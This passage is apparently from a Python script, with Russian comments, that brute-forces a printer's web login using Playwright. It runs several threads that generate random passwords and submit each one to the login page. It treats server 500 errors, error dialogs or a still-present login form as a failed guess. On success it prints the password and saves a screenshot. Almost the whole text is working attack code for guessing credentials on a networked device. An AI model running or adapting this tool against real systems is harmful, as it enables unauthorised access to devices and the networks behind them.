                    final_time_check = time.time()
                    final_server_errors_check = [e for e in server_errors if (final_time_check - e['timestamp']) < 3]
                    
                    if final_server_errors_check:
                        # Обнаружены ошибки 500 - пароль неверный!
                        with lock:
                            attempts_count += 1
                            if attempts_count % 10 == 0:
                                elapsed = (datetime.now() - start_time).total_seconds()
                                print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                      f"Последний: {password}, Время: {elapsed:.1f}с")
                            else:
                                print(f"[Поток {thread_id}] ❌ Пароль неверный (ошибка 500): {password}")
                        browser.close()
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        return False
                    
                    # Проверка 2: Диалог (быстрая проверка)
                    if dialog_appeared and is_error:
                        # Диалог с ошибкой присутствует - пароль неверный!
                        with lock:
                            attempts_count += 1
                            if attempts_count % 10 == 0:
                                elapsed = (datetime.now() - start_time).total_seconds()
                                print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                      f"Последний: {password}, Время: {elapsed:.1f}с")
                            else:
                                print(f"[Поток {thread_id}] ❌ Пароль неверный (диалог с ошибкой): {password}")
                        browser.close()
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        return False
                    
                    # СТРОГАЯ проверка: успешный вход только если:
                    # - Поля исчезли И все еще отсутствуют
                    # - И URL изменился (обязательно!)
                    # - И нет диалога с ошибкой (проверили выше)
                    # Успешный вход определяется по:
                    # - НЕТ ошибок 500 (основной критерий - уже проверили выше)
                    # - НЕТ диалога с ошибкой (уже проверили выше)
                    # - Поля логина/пароля исчезли и остаются отсутствующими
                    if fields_disappeared and fields_still_gone:
                        # Все условия выполнены - это успешный вход!
                        login_successful = True
                        with lock:
                            print(f"[Поток {thread_id}] ✅ Признаки успешного входа:")
                            print(f"[Поток {thread_id}]    - Поля исчезли и остаются отсутствующими")
                            print(f"[Поток {thread_id}]    - Нет ошибок сервера 500")
                            print(f"[Поток {thread_id}]    - Нет диалогов с ошибкой")
                    else:
                        # Поля не исчезли - пароль неверный
                        with lock:
                            attempts_count += 1
                            if attempts_count % 10 == 0:
                                elapsed = (datetime.now() - start_time).total_seconds()
                                print(f"[Поток {thread_id}] ❌ Попыток: {attempts_count}, "
                                      f"Последний: {password}, Время: {elapsed:.1f}с")
                            else:
                                print(f"[Поток {thread_id}] ❌ Пароль неверный (поля не исчезли): {password}")
                        browser.close()
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        return False
                    
                    if login_successful:
                        # УСПЕШНЫЙ ВХОД!
                        with lock:
                            found_password = password
                            print(f"\n{'='*50}")
                            print(f"✅ ПАРОЛЬ НАЙДЕН: {password}")
                            print(f"✅ Время: {datetime.now() - start_time}")
                            print(f"✅ Попыток: {attempts_count + 1}")
                            print(f"{'='*50}")
                        
                        # Скриншот успешного входа
                        try:
                            page.screenshot(path=f"success_{password}.png")
                            if not headless_mode:
                                print(f"[Поток {thread_id}] 📸 Скриншот сохранен: success_{password}.png")
                        except:
                            pass
                        browser.close()
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        return True
                    else:
                        # Если поля не исчезли и URL не изменился - пароль неверный
                        if not headless_mode:
                            print(f"[Поток {thread_id}] ⚠️  Поля остались на месте, пароль неверный")
                        
                except Exception as e:
                    if not headless_mode:
                        print(f"[Поток {thread_id}] ⚠️  Ошибка проверки успешности входа: {e}")
                    # Если ошибка при проверке - считаем пароль неверным
                    pass
                
                # Если дошли сюда - пароль неверный
                with lock:
                    attempts_count += 1
                    if attempts_count % 10 == 0:
                        elapsed = (datetime.now() - start_time).total_seconds()
                        print(f"[Поток {thread_id}] Попыток: {attempts_count}, "
                              f"Последний: {password}, Время: {elapsed:.1f}с")
                
                browser.close()
                time.sleep(DELAY_BETWEEN_ATTEMPTS)
                return False
                
        except Exception as e:
            error_msg = str(e)
            # Определяем тип ошибки
            is_timeout = "Timeout" in error_msg or "timeout" in error_msg.lower()
            is_connection_error = "ERR_CONNECTION" in error_msg or "connection" in error_msg.lower() or "ECONNREFUSED" in error_msg
            
            # Если это ошибка соединения или таймаут - пробуем повторить
            if (is_timeout or is_connection_error) and retry < MAX_RETRIES - 1:
                if not headless_mode:
                    print(f"[Поток {thread_id}] ⚠️  Ошибка соединения/таймаут, повторная попытка {retry + 1}/{MAX_RETRIES}...")
                # Увеличиваем задержку перед повтором при ошибках соединения
                time.sleep(3 + retry * 2)  # 3, 5, 7 секунд
                continue
            
            # Если это последняя попытка, логируем ошибку
            if retry == MAX_RETRIES - 1:
                with lock:
                    # Не логируем каждую ошибку таймаута/соединения, чтобы не засорять вывод
                    if not (is_timeout or is_connection_error) or attempts_count % 50 == 0:
                        print(f"[Поток {thread_id}] Ошибка при проверке '{password}': {error_msg[:100]}")
                    attempts_count += 1
                time.sleep(DELAY_BETWEEN_ATTEMPTS)
            else:
                # Небольшая задержка перед повтором для других ошибок
                time.sleep(2)
                continue
    
    # Если все попытки исчерпаны, возвращаем False
    time.sleep(DELAY_BETWEEN_ATTEMPTS)
    return False

# ==================== ГЕНЕРАТОР ПАРОЛЕЙ ====================
# Удалена функция generate_passwords - используем более эффективный подход через индексацию

# Глобальный генератор паролей с случайным порядком
# Используем подход с порциями для избежания загрузки всех паролей в память
passwords_queue = None
generator_lock = threading.Lock()
BATCH_SIZE = 50000  # Размер порции паролей для генерации (увеличен для уменьшения блокировок)
recent_passwords = set()  # Храним последние использованные пароли (максимум 10000)
MAX_RECENT_SIZE = 10000

def generate_random_password():
    """Генерирует случайный пароль заданной длины"""
    length = random.randint(MIN_LENGTH, MAX_LENGTH)
    return ''.join(random.choice(CHARSET) for _ in range(length))

def generate_password_batch(batch_size):
    """Генерирует порцию случайных паролей, избегая недавно использованных"""
    batch = []
    attempts = 0
    max_attempts = batch_size * 2  # Максимум попыток для генерации порции
    
    while len(batch) < batch_size and attempts < max_attempts:
        password = generate_random_password()
        # Избегаем недавно использованных паролей
        if password not in recent_passwords:
            batch.append(password)
        attempts += 1
    
    # Если не удалось сгенерировать достаточно уникальных паролей,
    # добавляем случайные (даже если они были недавно использованы)
    while len(batch) < batch_size:
        batch.append(generate_random_password())
    
    return batch

def get_next_password():
    """Потокобезопасное получение следующего пароля в случайном порядке (оптимизировано)"""
    global passwords_queue, recent_passwords
    
    # Быстрая проверка без блокировки
    if passwords_queue is None:
        with generator_lock:
            if passwords_queue is None:
                passwords_queue = queue.Queue()
                print(f"✅ Используется случайный порядок перебора (порциями по {BATCH_SIZE})")
    
    # Пытаемся получить пароль без блокировки (быстро)
    try:
        password = passwords_queue.get_nowait()
        # Обновляем recent_passwords с минимальной блокировкой
        with generator_lock:
            recent_passwords.add(password)
            # Ограничиваем размер только если нужно (не каждый раз)
            if len(recent_passwords) > MAX_RECENT_SIZE:
                to_remove = list(recent_passwords)[:len(recent_passwords) - MAX_RECENT_SIZE + BATCH_SIZE]
                for pwd in to_remove:
                    recent_passwords.discard(pwd)
        return password
    except queue.Empty:
        # Очередь пуста - генерируем новый батч (только здесь нужна блокировка)
        with generator_lock:
            # Двойная проверка (другой поток мог уже заполнить очередь)
            if passwords_queue.empty():
                batch = generate_password_batch(BATCH_SIZE)
                random.shuffle(batch)
                for pwd in batch:
                    passwords_queue.put(pwd)
            # Получаем пароль
            password = passwords_queue.get_nowait()
            recent_passwords.add(password)
            return password

# ==================== РАБОЧИЙ ПОТОК ====================
def worker(thread_id, headless_mode=True):
    global found_password, attempts_count
    
    local_attempts = 0  # Локальный счетчик для уменьшения блокировок
    
    while found_password is None:
        password = get_next_password()
        if password is None:
            # Все пароли перебраны
            break
        
        if check_password(password, thread_id, headless_mode, local_attempts):
            return True
        
        local_attempts += 1
        # Обновляем глобальный счетчик каждые 5 попыток (вместо каждой)
        if local_attempts % 5 == 0:
            with lock:
                attempts_count += 5
    
    # Обновляем финальный счетчик
    if local_attempts % 5 != 0:
        with lock:
            attempts_count += (local_attempts % 5)
    
    return False

# ==================== ГЛАВНАЯ ФУНКЦИЯ ====================
def main(test_mode=False):
    global found_password, MAX_WORKERS
    
    # В тестовом режиме используем 2 потока и видимый браузер
    headless_mode = not test_mode
    workers_count = 2 if test_mode else MAX_WORKERS
    
    if test_mode:
        print("🧪 ТЕСТОВЫЙ РЕЖИМ: Запуск с видимым браузером (2 потока)")
        print("="*50)
    
    # Подсчет общего количества комбинаций (для информации)
    total_combinations = sum(len(CHARSET) ** length for length in range(MIN_LENGTH, MAX_LENGTH + 1))
    
    print(f"🚀 Начало тестирования {TARGET_URL}")
    print(f"👤 Логин: {USERNAME}")
    print(f"🔢 Потоков: {workers_count}")
    print(f"🖥️  Режим браузера: {'Видимый' if not headless_mode else 'Headless'}")
    print(f"📏 Длина пароля: {MIN_LENGTH}-{MAX_LENGTH} символов")
    print(f"🔤 Набор символов: {CHARSET[:50]}{'...' if len(CHARSET) > 50 else ''}")
    print(f"📊 Всего возможных комбинаций: {total_combinations:,}")
    print(f"⏱️  Задержка между попытками: {DELAY_BETWEEN_ATTEMPTS}с")
    print("="*50)
    if not test_mode:
        print("⚠️  ВНИМАНИЕ: Это может занять очень много времени!")
        print("="*50)
    
    # Запуск многопоточного перебора
    with ThreadPoolExecutor(max_workers=workers_count) as executor:
        futures = []
        
        # Создание задач для каждого потока
        for i in range(workers_count):
            future = executor.submit(worker, i+1, headless_mode)
            futures.append(future)
        
        # Ожидание завершения
        for future in as_completed(futures):
            try:
                result = future.result()
                if result or found_password is not None:
                    # Пароль найден - отменяем остальные задачи
                    print("⏳ Ожидание завершения остальных потоков...")
                    # В Python 3.9+ можно использовать cancel_futures
                    try:
                        executor.shutdown(wait=False, cancel_futures=True)
                    except:
                        executor.shutdown(wait=False)
                    break
            except Exception as e:
                print(f"Ошибка в потоке: {e}")
    
    if found_password is None:
        print("\n❌ Пароль не найден в диапазоне {}-{} символов".format(MIN_LENGTH, MAX_LENGTH))
        print(f"⏱️  Время работы: {datetime.now() - start_time}")
        print(f"🔢 Попыток сделано: {attempts_count}")
    else:
        print(f"\n✅ Завершено! Пароль: {found_password}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    # Парсинг аргументов командной строки
    parser = argparse.ArgumentParser(description='Подбор пароля принтера через Playwright')
    parser.add_argument('--test', action='store_true', 
                        help='Тестовый режим: запуск с видимым браузером (2 потока)')
    args = parser.parse_args()
    
    try:
        main(test_mode=args.test)
    except KeyboardInterrupt:
        print("\n\n🛑 Прервано пользователем")
        print(f"⏱️  Время работы: {datetime.now() - start_time}")
        print(f"🔢 Попыток сделано: {attempts_count}")

